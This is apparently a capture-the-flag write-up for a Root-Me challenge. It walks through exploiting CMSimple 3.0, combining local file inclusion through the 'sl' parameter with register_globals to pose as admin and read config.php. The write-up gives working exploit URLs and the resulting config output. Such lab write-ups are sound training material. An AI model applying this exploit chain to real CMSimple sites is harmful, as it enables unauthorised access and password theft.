The challenge states that CMSimple has been used to configure the server. I invite you to download the code source of the used CMSimple : https://www.cmsimple.org/archives/cmsimple_old/?download=cmsimple3_0.zip

We see that the password is contained in the config.php file. That is what we are going to try to obtain.
Then, after looking for CMSimple 3.0 exploit, I saw that LFI was possible by adding an argument ?sl=FILE, file being a path, so ../ are allowed. So for example, if you want to include the adm.php file, you can enter the following address:

http://challenge01.root-me.org/realiste/ch6/?sl=../adm

Register_globals is on, so we can pass a lot of arguments in the URL. For example, we can put &adm=1, so we are seen as an admin.
Then, we see that we can print any file by passing the argument &f=file&file=YOUR_FILE&action=view.

Let's do it for the config file. The final URL is
http://challenge01.root-me.org/realiste/ch6/?sl=../adm&adm=1&f=file&file=config&action=view

and we see:

```
<?php
$cf['security']['password']="FLAG";
$cf['security']['type']="page";
$cf['site']['title']="So easy to p0wn !";
$cf['site']['template']="default";
$cf['language']['default']="en";
$cf['meta']['keywords']="mpffff, so weak";
$cf['meta']['description']="CMSimple is a simple content management system for idiot maintainance of small commercial or private sites. It is simple - small - idiot !";
$cf['backup']['numberoffiles']="5";
$cf['images']['maxsize']="150000";
$cf['downloads']['maxsize']="1000000";
$cf['mailform']['email']="";
$cf['editor']['height']="(screen.availHeight)-400";
$cf['editor']['external']="";
$cf['menu']['color']="000000";
$cf['menu']['highlightcolor']="808080";
$cf['menu']['levels']="3";
$cf['menu']['levelcatch']="10";
$cf['menu']['sdoc']="";
$cf['uri']['seperator']=":";
$cf['uri']['length']="200";
$cf['xhtml']['endtags']="";
$cf['xhtml']['amp']="true";
$cf['plugins']['folder']="";
$cf['functions']['file']="functions.php";
$cf['scripting']['regexp']="\#CMSimple (.*?)\#";
?>
```

GG ! You have the flag.
